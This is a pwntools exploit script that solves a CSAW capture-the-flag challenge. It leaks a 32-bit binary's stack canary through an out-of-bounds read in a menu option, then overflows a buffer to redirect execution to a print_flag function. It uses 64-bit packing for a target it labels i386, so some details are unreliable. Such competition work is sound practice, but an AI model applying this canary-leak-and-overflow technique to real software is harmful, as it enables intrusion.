#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.csaw.io --port 7900 share/unlimited_subway
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'share/unlimited_subway')
context.terminal = ["kitty", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwn.csaw.io'
port = int(args.PORT or 7900)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

# get 32-bit canary (4 bytes)
# canary is at an 128-byte offset from `account_details`
def leak_part(io: socket,
              index: int) -> bytes:
    # view account details
    io.sendline(b'V')

    # get specific data at the index
    io.recvuntil(b": ")
    io.sendline(bytes(str(index), "ascii"))

    leaked_data = [data.strip() for data in io.recvuntil(b'\n').split(b':')]
    # confirm index
    checked_index = int(leaked_data[0].split(b' ')[-1])
    if(index != checked_index): log.critical("Indicies do not match!")

    part = leaked_data[1].decode("ascii")
    # return the byte
    return int("0x"+part,16)

def get_canary(io: socket):
    offset = 128
    canary = 0
    canary_size = 4 # bytes
    for i in range(canary_size):
        part = leak_part(io, offset+i)
        print(hex(part))
        canary += part << 8 * i # shift bits to the right position in memory

    return canary

io.recvuntil(b'> ')
canary = get_canary(io)
log.info("received canary: " + hex(canary))
io.recvuntil(b'> ')

# now that we have a canary, we can exit and rewrite the canary
payload = [
    b'E\n', # exit the loop
    b'80\n', # the amount to write (name buffer size + sizeof(canary) + sizeof(return address))
    b"petiole", # :)
    b'a' * (64 - len("petiole")),
    p64(canary),
    p64(0x08049304), # address of the print_flag function
]

io.sendline(b''.join(payload))

io.interactive()

